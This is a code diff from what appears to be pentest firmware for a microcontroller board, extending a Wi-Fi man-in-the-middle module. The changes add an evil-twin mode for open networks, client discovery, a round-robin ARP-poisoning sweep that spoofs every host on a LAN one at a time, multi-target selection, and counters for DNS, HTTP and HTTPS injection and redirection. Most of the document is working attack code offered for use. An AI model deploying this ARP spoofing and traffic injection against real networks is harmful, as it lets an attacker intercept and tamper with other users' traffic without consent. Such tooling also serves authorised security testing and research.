+        vTaskDelay(pdMS_TO_TICKS(25));
+    }
+    mitmClearKeys();
 }
 
 /**
@@ -1184,6 +1591,7 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     String err;
     mitmLogClear();
     mitmRunStart = millis();
+    mitmLogBegin(path);
 
     // ---- ucmitm: no password, no station link, an evil twin instead ----
     if (mitmUcEnabled() || r.uc) {
@@ -1201,19 +1609,27 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
             mitmUcEnsureNetwork();
         }
         if (!mitmUcNetworkOk()) return "err: pick a network for ucmitm first";
+        mitmLogSetSsid(mitmUcSsid());
         mitmLogAdd("ucmitm - " + mitmUcSsid() + " ch" + String(mitmUcChannel()) + " (no password)");
+        // Own the panel before the first listen. mitmUcScanClients() blocks the
+        // radio for seconds and cannot repaint, so without this the screen kept
+        // showing the menu the attack was started from - which is what made a
+        // ucmitm run look frozen the moment Start attack was pressed.
+        if (draw) mitmDrawRun(0, "ucmitm", 0, true);
         if (r.ucSniffMs > 0) {
             mitmLogAdd("listening " + String(r.ucSniffMs / 1000) + "s for clients of that AP");
             int seen = mitmUcScanClients(r.ucSniffMs);
             mitmLogAdd("clients seen: " + String(seen));
             for (int i = 0; i < seen && i < 4; i++) mitmLogAdd("client " + mitmUcClientLabel(i));
             for (int i = 0; i < mitmUcProbeCount() && i < 3; i++) mitmLogAdd("seeks " + mitmUcProbeSsid(i));
+            if (draw) mitmDrawRun(0, "ucmitm", 0, false);
         }
         if (mitmUcClientCount() == 0) {
             // No `sniff` line, or nothing collected yet: listen once, so the run
             // reports the AP's clients instead of a constant 0 (the twin's own
             // count only ever shows who adopted it).
             mitmLogAdd("discovery: listening for the AP's clients");
+            if (draw) mitmDrawRun(0, "ucmitm", 0, false);
             int seen = mitmUcScanClients(MITM_UC_DISCOVERY_MS);
             mitmLogAdd(
                 "on the AP: " + String(seen) + " client(s), " + String(mitmUcProbeCount()) + " seeks"
@@ -1230,12 +1646,20 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
             // A pure recon payload: there is nothing to serve and no twin to
             // start, so watch the air on the picked channel and report it. No
             // password is involved on this path either.
-            int seen = mitmUcPassiveScan(
-                mitmUcChannel(), r.ucSniffMs > 0 ? r.ucSniffMs : MITM_RECON_SNIFF_MS
+            uint32_t watchMs = r.ucSniffMs > 0 ? r.ucSniffMs : MITM_RECON_SNIFF_MS;
+            mitmLogAdd(
+                String("no page to serve - watching ch") + String(mitmUcChannel()) + " for " +
+                String(watchMs / 1000) + "s"
             );
-            mitmLogAdd(String("no page to serve - watched ch") + String(mitmUcChannel()));
+            if (draw) mitmDrawRun(0, "watching", 0, false);
+            int seen = mitmUcPassiveScan(mitmUcChannel(), watchMs);
             mitmLogAdd("stations seen: " + String(seen));
+            for (int i = 0; i < seen && i < 6; i++) mitmLogAdd("station " + mitmUcClientLabel(i));
             for (int i = 0; i < mitmUcProbeCount() && i < 6; i++) mitmLogAdd("seeks " + mitmUcProbeSsid(i));
+            mitmLogAdd("recon done - BACK to return");
+            // The results are the whole run, so they stay on screen instead of
+            // dropping back to the menu the instant the scan returns.
+            if (draw) mitmHoldRunScreen(durationMs, "recon done");
             return String();
         }
         String ucSummary;
@@ -1246,6 +1670,7 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     }
 
     if (!mitmEnsureStation()) return "err: connect to WiFi first";
+    mitmLogSetSsid(WiFi.SSID());
     if (draw) {
         drawMainBorderWithTitle("MITM RUN");
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
@@ -1262,6 +1687,7 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     mitmLogAdd(
         String("payload: ") + String(r.pages) + " page " + String(r.redirects) + " redir " + String(r.dns) + " dns"
     );
+    mitmLogAdd(String("target: ") + mitmTargetLabel());
 
     // A recon payload has more than one way to work. `observeOnly` is the mode
     // with no rule at all: it only wants to see the traffic, so a missing ARP
@@ -1269,7 +1695,70 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     const bool observeOnly =
         (r.pages + r.redirects + r.dns) == 0 && (r.forward != 0 || r.wantInfo || r.probeCount > 0);
 
-    int pairs = mitmPairTargets(r.target, err);
+    // Many-target sweep: one ARP pair at a time, round-robin over the scan.
+    // Pairing every host at once (the old "All devices") fills the 200-pair
+    // table and multiplies the re-poison load - on a big network that is what
+    // crashed the board. Every all-device run sweeps now, with or without a
+    // `sweep` line, so the pair table cannot grow with the network; `sweep <ms>`
+    // only changes the dwell. A host is skipped once served and `skip <ip>`
+    // hosts are never paired.
+    // The Target row is explicit operator intent and wins over the payload's
+    // `target` line. rickrollv2.mitm says `target all`, and honouring that while
+    // a single host was picked is exactly the bug where one target turned into
+    // the whole network. A payload `target` is only a default for the "All
+    // devices" mode (where an IP there narrows the run to that host).
+    String targetOverride = mitmAllTargets ? r.target : String();
+    const bool sweepAll = mitmAllTargets && (targetOverride.length() == 0 || targetOverride == "all");
+    const uint32_t sweepDwellMs = r.sweep ? r.sweepDwellMs : 1200;
+    int sweepCount = 0, sweepCursor = 0, sweepCurrent = -1, sweepServed = 0;
+    uint32_t sweepLast = 0, sweepHits = 0;
+    bool sweepFinished = false;
+    uint8_t sweepDone[(NETSPOOF_MAX_TARGETS + 7) / 8];
+    memset(sweepDone, 0, sizeof(sweepDone));
+    // Two bits per host: how many idle windows it has already had. A host that
+    // sends not one frame during its window is retired at once (printer, idle
+    // plug, phone asleep); one that talks but never takes a rule is retired
+    // after MITM_SWEEP_IDLE_ROUNDS windows. Re-poisoning silent hosts round
+    // after round only ate the run and looked like "sweeping over hosts that
+    // never redirect".
+    uint8_t sweepIdle[(NETSPOOF_MAX_TARGETS + 3) / 4];
+    memset(sweepIdle, 0, sizeof(sweepIdle));
+    uint32_t sweepFramesAtStart = 0;
+
+    int pairs = 0;
+    if (sweepAll) {
+        String serr;
+        int found = netspoof_scan_targets(8000, serr);
+        sweepCount = netspoof_target_count();
+        mitmLogAdd(String("sweep: ") + String(found) + " host(s), one pair at a time");
+        if (found <= 0) {
+            err = serr.length() ? serr : String("no hosts found");
+        } else {
+            for (int k = 0; k < sweepCount; k++) {
+                int i = (sweepCursor + k) % sweepCount;
+                const NetSpoofTarget *t = netspoof_target(i);
+                if (!t || t->gateway || mitmIsSkipped(t->ip)) {
+                    sweepDone[i >> 3] |= (uint8_t)(1u << (i & 7));
+                    continue;
+                }
+                String e;
+                if (netspoof_arp_start_mac(t->ip, t->mac, IPAddress((uint32_t)0), e)) {
+                    pairs = 1;
+                    sweepCurrent = i;
+                    sweepCursor = (i + 1) % sweepCount;
+                    sweepLast = millis();
+                    sweepFramesAtStart = netspoof_arp_frames();
+                    mitmLogAdd(String("sweep 1/") + String(sweepCount) + ": " + t->ip.toString());
+                    break;
+                }
+                Serial.printf("[MITM] sweep pair %s failed: %s\n", t->ip.toString().c_str(), e.c_str());
+                sweepDone[i >> 3] |= (uint8_t)(1u << (i & 7));
+            }
+            if (pairs == 0) err = "sweep: no host could be paired";
+        }
+    } else {
+        pairs = mitmPairTargets(targetOverride, err);
+    }
     if (pairs == 0) {
         if (!observeOnly) return "err: " + (err.length() ? err : String("no ARP pair"));
         // No pair means no victim frame can arrive here, so the poisoned view is
@@ -1355,6 +1844,7 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
 
     uint32_t started = millis();
     uint32_t lastDraw = 0, lastPrint = 0;
+    bool firstDraw = draw; // the frame is painted once; later passes touch changes only
     netspoof_capture_clear();
     uint32_t lastCaptureTotal = netspoof_capture_total();
     int fallbackNext = 0;
@@ -1367,6 +1857,83 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
         uint32_t now = millis();
         uint32_t hits = netspoof_http_injected() + netspoof_http_redirected() + netspoof_https_injected() +
                         netspoof_https_redirected();
+
+        // Sweep tick: a served host is retired at once; an idle one gets the
+        // dwell window and is retried in the next round (never re-served once
+        // it has hit). Only one pair is ever live, so the pair table cannot
+        // grow with the size of the network.
+        if (sweepAll && !sweepFinished) {
+            bool servedNow = hits > sweepHits;
+            if (servedNow) {
+                sweepHits = hits;
+                if (sweepCurrent >= 0 && sweepCurrent < sweepCount) {
+                    sweepDone[sweepCurrent >> 3] |= (uint8_t)(1u << (sweepCurrent & 7));
+                    sweepServed++;
+                }
+            }
+            // A host that is actively talking gets a few windows before the
+            // sweep rotates away: a browser has to ARP back to the board and
+            // open the page, and rotating out mid-load is what made an
+            // all-device run sweep straight past the phone. Capped, so one busy
+            // host cannot starve the rest of the network, and a quiet host still
+            // gets exactly one window.
+            uint32_t sweepWindows = sweepDwellMs ? ((now - sweepLast) / sweepDwellMs) : 0;
+            bool sweepBusy = netspoof_arp_frames() > sweepFramesAtStart;
+            if (servedNow || sweepWindows >= (sweepBusy ? MITM_SWEEP_WINDOWS : 1)) {
+                // Finish with this host before dropping its pair: served hosts
+                // and silent ones are retired now, busy ones get a few more
+                // windows before the sweep gives up on them.
+                if (!servedNow && sweepCurrent >= 0 && sweepCurrent < sweepCount) {
+                    int done = sweepCurrent;
+                    int shift = (done & 3) * 2;
+                    int rounds = (sweepIdle[done >> 2] >> shift) & 0x3;
+                    bool silent = netspoof_arp_frames() == sweepFramesAtStart;
+                    if (silent) rounds = MITM_SWEEP_IDLE_ROUNDS;
+                    else if (rounds < MITM_SWEEP_IDLE_ROUNDS) rounds++;
+                    sweepIdle[done >> 2] = (uint8_t)(
+                        (sweepIdle[done >> 2] & ~(0x3u << shift)) | ((uint32_t)rounds << shift)
+                    );
+                    if (rounds >= MITM_SWEEP_IDLE_ROUNDS) {
+                        sweepDone[done >> 3] |= (uint8_t)(1u << (done & 7));
+                        const NetSpoofTarget *dt = netspoof_target(done);
+                        if (silent && dt) mitmLogAdd(String("sweep silent: ") + dt->ip.toString());
+                    }
+                }
+                String e;
+                if (netspoof_arp_active()) netspoof_arp_stop(e);
+                sweepCurrent = -1;
+                int next = -1;
+                for (int k = 0; k < sweepCount; k++) {
+                    int i = (sweepCursor + k) % sweepCount;
+                    const NetSpoofTarget *t = netspoof_target(i);
+                    if (!t || t->gateway || mitmIsSkipped(t->ip)) continue;
+                    if (sweepDone[i >> 3] & (uint8_t)(1u << (i & 7))) continue;
+                    next = i;
+                    break;
+                }
+                if (next < 0) {
+                    sweepFinished = true;
+                    mitmLogAdd(
+                        String("sweep done: ") + String(sweepServed) + "/" + String(sweepCount) + " served"
+                    );
+                } else {
+                    const NetSpoofTarget *t = netspoof_target(next);
+                    if (t && netspoof_arp_start_mac(t->ip, t->mac, IPAddress((uint32_t)0), e)) {
+                        sweepCurrent = next;
+                        sweepCursor = (next + 1) % sweepCount;
+                        sweepFramesAtStart = netspoof_arp_frames();
+                        mitmLogAdd(
+                            String("sweep ") + String(sweepServed + 1) + "/" + String(sweepCount) + ": " +
+                            t->ip.toString()
+                        );
+                    } else {
+                        sweepDone[next >> 3] |= (uint8_t)(1u << (next & 7));
+                        mitmLogAdd(String("sweep skip ") + (t ? t->ip.toString() : String("?")));
+                    }
+                }
+                sweepLast = now;
+            }
+        }
 
         // Fallbacks are a timetable: each line fires at its own time from the
         // start, and only while the attack has not produced a single hit, so a
@@ -1396,7 +1963,8 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
         }
         if (draw && now - lastDraw >= 250) {
             lastDraw = now;
-            mitmDrawRun(netspoof_arp_pair_count(), fallbackState, hits);
+            mitmDrawRun(netspoof_arp_pair_count(), fallbackState, hits, firstDraw);
+            firstDraw = false;
         }
         vTaskDelay(pdMS_TO_TICKS(25));
     }
@@ -1422,7 +1990,9 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     if (netspoof_arp_active()) netspoof_arp_stop(e3);
 
     mitmClearKeys();
-    String summary = String("pairs ") + String(pairs) + " dns " + String(netspoof_dns_answers()) + "/" +
+    String summary = String("pairs ") + String(pairs) +
+                     (sweepAll ? " sweep " + String(sweepServed) + "/" + String(sweepCount) : String()) +
+                     " dns " + String(netspoof_dns_answers()) + "/" +
                      String(netspoof_dns_queries()) + " http " + String(netspoof_http_injected()) + "/" +
                      String(netspoof_http_requests()) + " https " + String(netspoof_https_injected()) + "/" +
                      String(netspoof_https_requests());
@@ -1455,6 +2025,9 @@ static String mitmRunOutcome;
 static void mitmRunTask(void *arg) {
     MitmRunArgs *a = static_cast<MitmRunArgs *>(arg);
     mitmRunOutcome = mitmRunCore(a->path, a->durationMs, a->draw);
+    // The attack is closed: this is the only moment the card is written, so the
+    // feed costs nothing while the run is live.
+    mitmLogFlush();
     delete a;
     mitmRunDone = true;
     vTaskDelete(nullptr);
@@ -1463,13 +2036,19 @@ static void mitmRunTask(void *arg) {
 /// Run one payload on a stack of its own and return its outcome.
 static String mitmRunIsolated(const String &path, uint32_t durationMs, bool draw) {
     MitmRunArgs *args = new (std::nothrow) MitmRunArgs{path, durationMs, draw};
-    if (args == nullptr) return mitmRunCore(path, durationMs, draw);
+    if (args == nullptr) {
+        String out = mitmRunCore(path, durationMs, draw);
+        mitmLogFlush();
+        return out;
+    }
     mitmRunDone = false;
     mitmRunOutcome = "";
     if (xTaskCreate(mitmRunTask, "mitm_run", 12288, args, 5, nullptr) != pdPASS) {
         // No task available: the old path is still better than refusing to run.
         delete args;
-        return mitmRunCore(path, durationMs, draw);
+        String out = mitmRunCore(path, durationMs, draw);
+        mitmLogFlush();
+        return out;
     }
     while (!mitmRunDone) vTaskDelay(pdMS_TO_TICKS(20));
     return mitmRunOutcome;
@@ -1495,6 +2074,48 @@ bool mitmAttackSetTarget(const String &spec) {
         mitmSetTargetAll();
         return true;
     }
+    // "ip,ip,..." (or spaces) selects a set without the UI. Used by the console
+    // and by headless tests; a single address keeps the old behaviour.
+    if (who.indexOf(',') >= 0 || who.indexOf(' ') >= 0) {
+        String list = who;
+        list.replace(' ', ',');
+        String picked[MITM_MULTI_MAX];
+        int count = 0;
+        int start = 0;
+        while (start < list.length()) {
+            int sep = list.indexOf(',', start);
+            String part = sep < 0 ? list.substring(start) : list.substring(start, sep);
+            part.trim();
+            if (part.length()) {
+                IPAddress ip;
+                if (!ip.fromString(part.c_str())) return false;
+                String s = ip.toString();
+                bool dup = false;
+                for (int i = 0; i < count; i++)
+                    if (picked[i] == s) dup = true;
+                if (!dup) {
+                    if (count >= MITM_MULTI_MAX) return false;
+                    picked[count++] = s;
+                }
+            }
+            if (sep < 0) break;
+            start = sep + 1;
+        }
+        if (count == 0) return false;
+        // Commit only after the whole list parsed: a typo must not throw away
+        // the selection that is already active (that is what turned an invalid
+        // `mitm target` into a silent fallback to a stale single host).
+        mitmMultiCount = count;
+        for (int i = 0; i < count; i++) {
+            mitmMultiIp[i] = picked[i];
+            mitmMultiMacOk[i] = false;
+        }
+        mitmMultiTargets = true;
+        mitmAllTargets = false;
+        mitmTargetIpStr = "";
+        mitmAttackNote = "ok: " + String(count) + " target(s)";
+        return true;
+    }
     IPAddress ip;
     if (!ip.fromString(who.c_str())) return false;
     mitmSetTargetOne(ip, nullptr);
@@ -1505,7 +2126,11 @@ String mitmAttackPayloadPath() { return mitmScriptPath; }
 
 void mitmAttackSetPayload(const String &path) { mitmScriptPath = path; }
 
-String mitmAttackTargetLabel() { return mitmTargetLabel(); }
+String mitmAttackTargetLabel() {
+    // No spaces: this is a key=value field in `mitm status`/`mitm target`.
+    if (mitmMultiTargets) return String("multi:") + String(mitmMultiCount);
+    return mitmTargetLabel();
+}
 
 bool mitmAttackRunHeadless(const String &path, uint32_t ms, String &summary, String &error, bool draw) {
     String s = mitmRunIsolated(path, ms, draw);
@@ -1622,17 +2247,11 @@ AGAIN:
     rows.push_back({String("Payload: ") + (mitmScriptPath.length() ? mitmShortPath(mitmScriptPath) : String("none")),
                     []() { mitmPickPayload(); }});
     rows.push_back({"Preview payload", []() { mitmPreviewPayload(); }});
-    rows.push_back({String("Save log: ") + (mitmSaveLog ? "on" : "off"), []() {
+    // One toggle, one destination: /wifi/MITM/<network>.log, written after the
+    // run stops (see mitmLogFlush) so the card is never touched mid-attack.
+    rows.push_back({String("Save logs: ") + (mitmSaveLog ? "on" : "off"), []() {
                         mitmSaveLog = !mitmSaveLog;
-                        if (!mitmSaveLog) return;
-                        mitmEnsurePayloadDirs();
-                        FS *fs = mitmFs();
-                        if (fs == nullptr) return;
-                        File f = fs->open(MITM_LOG_FILE, FILE_APPEND);
-                        if (f) {
-                            f.printf("\n# --- log on (run feed follows) ---\n");
-                            f.close();
-                        }
+                        if (mitmSaveLog) mitmEnsureLogDir();
                     }});
     if (netspoof_dns_active() || netspoof_http_active() || netspoof_https_active() || netspoof_arp_active()) {
         rows.push_back({"Stop + restore", []() {
